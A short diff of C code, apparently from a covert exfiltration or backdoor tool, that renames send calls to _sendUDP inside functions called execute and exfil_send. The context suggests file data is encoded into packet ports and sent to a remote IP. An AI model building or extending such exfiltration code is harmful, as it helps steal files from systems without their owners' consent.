@@ -179,7 +179,7 @@ void execute(char *command, u_int32_t ip, u_int16_t port, int duplex)
 //			src_port = (frame[0] << 8) + frame[i];
 //			dst_port = 9001;
 
-//			_send(ip, src_port, dst_port, TRUE);
+//			_sendUDP(ip, src_port, dst_port, TRUE);
 			
 			usleep(SLEEP_TIME);
 
@@ -238,7 +238,7 @@ void exfil_send(uint32 ipaddr, char *path)
 
 			//free(enc);
 			
-			_send(ipaddr, src_port, dst_port, TRUE);
+			_sendUDP(ipaddr, src_port, dst_port, TRUE);
 			
 			usleep(SLEEP_TIME);
 		}
